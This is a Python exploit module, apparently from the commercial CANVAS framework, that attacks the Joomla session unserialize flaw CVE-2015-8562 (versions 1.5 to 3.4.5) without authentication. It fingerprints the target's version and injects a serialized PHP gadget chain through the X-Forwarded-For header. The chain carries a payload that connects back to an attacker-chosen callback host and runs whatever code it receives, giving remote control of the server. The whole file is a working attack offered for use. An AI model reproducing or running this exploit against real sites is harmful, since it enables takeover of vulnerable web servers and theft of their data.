#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#http://www.immunityinc.com/CANVAS/ for more information

# python imports
import sys
import base64
import string
import re

import logging

# path appends
if '.' not in sys.path:
    sys.path.append('.')

# CANVAS imports
from exploitutils import *
from tcpexploit import tcpexploit
import canvasengine
from phplistener import get_php_stage1


NAME                            = "Joomla session unserialize 1.5 to 3.4.5"
DESCRIPTION                     = "Joomla session unserialize 1.5 to 3.4.5"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Joomla"
DOCUMENTATION["Repeatability"]  = "Infinite"
DOCUMENTATION["CVE Name"]       = "CVE-2015-8562"
DOCUMENTATION["CVE Url"]        = "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-8562"

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Web Exploits"
PROPERTY['SITE']                = "Remote"
PROPERTY['ARCH']                = [ ["Linux", "Windows"] ]
PROPERTY['VERSION']             = [ "1.5 to 3.4.5" ]

NOTES = """
Pre-Auth
"""

CHANGELOG = """
"""


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)

        self.port = ""
        self.host = ""
        self.done = 0
        self.name = NAME
        self.basepath = "/"

        return

    def usage(self):
        print "Base options:"
        print "-v <version> -t <target ip> -l <callback ip> -d <callback port>"
        print "-O basepath:basepath -O port:port"
        return

    def getargs(self):
        """
        Get arguments for attack
        """
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port", self.port))

        self.basepath = self.argsDict.get("basepath", self.basepath)
        if not self.basepath.endswith("/"):
            self.basepath = self.basepath + "/"

        if self.basepath == '' or self.port == '':
            self.usage()
            sys.exit(1)

        return

    def neededListenerTypes(self):
        return [canvasengine.PHPMULTI]

    def check_vuln(self):
        socket = self.gettcpsock()
        try:
            socket.connect((self.host, self.port))
        except:
            logging.error("Cannot connect to " + self.host + ":" + str(self.port) + "\n")
            sys.exit(1)

        data  = "GET " + self.basepath + "language/en-GB/en-GB.xml HTTP/1.1\r\n"
        data += "Host: " + self.host + "\r\n\r\n"
        self.websend(socket, data)
        resp = self.webrecv(socket, size=5000)
        if not resp.startswith("HTTP/1.1 200 OK"):
            logging.info("Version not found. The site might be vulnerable")
            return 1

        pat = re.compile(".*<version>(.*?)</version>.*" ,re.DOTALL)
        version = re.match(pat, resp)
        version = version.group(1)
        if version >= "3.4.6":
            logging.error("The site is not vulnerable to this exploit")
            return 0
        elif version < "1.5":
            logging.error("The site is not vulnerable to this exploit")
            return 0
        else:
            logging.info("The site is vulnerable")
            return 1

    def send_query(self,craft_header):
        # Create the socket for connection
        socket = self.gettcpsock()
        try:
            socket.connect((self.host, self.port))
        except:
            logging.error("Cannot connect to " + self.host + ":" + str(self.port) + "\n")
            sys.exit(1)

        data  = "GET " + self.basepath + " HTTP/1.1\r\n"
        data += "Host: " + self.host + "\r\n"
        data += "X-Forwarded-For: " + craft_header + "\r\n\r\n"
        self.websend(socket, data)
        resp = self.webrecv(socket, size=5000)

        pat = re.compile(".*Cookie: (.*?)\r\n.*" ,re.DOTALL)
        cookie = re.match(pat, resp)
        cookie = cookie.group(1)

        data  = "GET " + self.basepath + " HTTP/1.1\r\n"
        data += "Host: " + self.host + "\r\n"
        data += "Cookie: " + cookie + "\r\n\r\n"

        self.websend(socket, data)

        r1 = self.webrecv(socket, size=5000)
        return r1

    def send_mosdef(self, data):
        # Create the socket for connection
        socket = self.gettcpsock()
        try:
            socket.connect((self.host, self.port))
        except:
            logging.error("Cannot connect to " + self.host + ":" + str(self.port) + "\n")
            sys.exit(1)

        self.websend(socket, data)

        return self.webrecv(socket, size=5000)

    def run(self):
        self.getargs()

        logging.info("%s attacking %s:%d (in progress)" % (NAME, self.host, self.port))

        logging.info("Attacking %s:%d" % (self.host, self.port))
        logging.info("Basepath: %s" % self.basepath)

        host_info = {}
        # set host info dict
        host_info['host'] = self.host
        host_info['port'] = self.port
        host_info['basepath'] = self.basepath

        is_vuln = self.check_vuln()
        if not is_vuln:
            sys.exit(1)

        invalid_mysql = '\xf0\x9d\x8c\x86'
        payload = "eval('function read_block($sock) { $z8LpTFL8=fread($sock,4); if(empty($z8LpTFL8)){ die(); } $size=(ord($z8LpTFL8{0}) * (pow(2,24))) + (ord($z8LpTFL8{1}) * pow(2,16)) + (ord($z8LpTFL8{2}) * pow(2,8)) +ord($z8LpTFL8{3}); $d9zeGGEN=\"\"; while ($size > 0 ) { $stNkLinC=fread($sock,$size); if ($stNkLinC===FALSE) { break; } $d9zeGGEN=$d9zeGGEN.$stNkLinC; $size-=strlen($stNkLinC); } return $d9zeGGEN; } $f=fsockopen(\"%s\",%d); if ($f) { while (1) { $ak3M1UhR=read_block($f); if ($ak3M1UhR==\"\") { break; } @set_time_limit(300); @ignore_user_abort(true); eval($ak3M1UhR); } }');JFactory::getConfig();exit" % (self.callback.ip, self.callback.port)

        # Classic POP chain used in every Joomla Exploit
        craft_header = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
        craft_header += r'''s:%d:"%s"''' % (len(payload), payload)
        craft_header += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + invalid_mysql

        # Inject the code
        response = self.send_query(craft_header)
        self.succeeded = 1
        ret = self.ISucceeded()
        if ret:
            logging.info("%s attacking %s:%d - done (success!)" % (NAME, self.host, self.port))
        else:
            logging.error("%s attacking %s:%d - done (failed)" % (NAME, self.host, self.port))

        return ret

    def shutdown(self):
        self.done = 1

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)

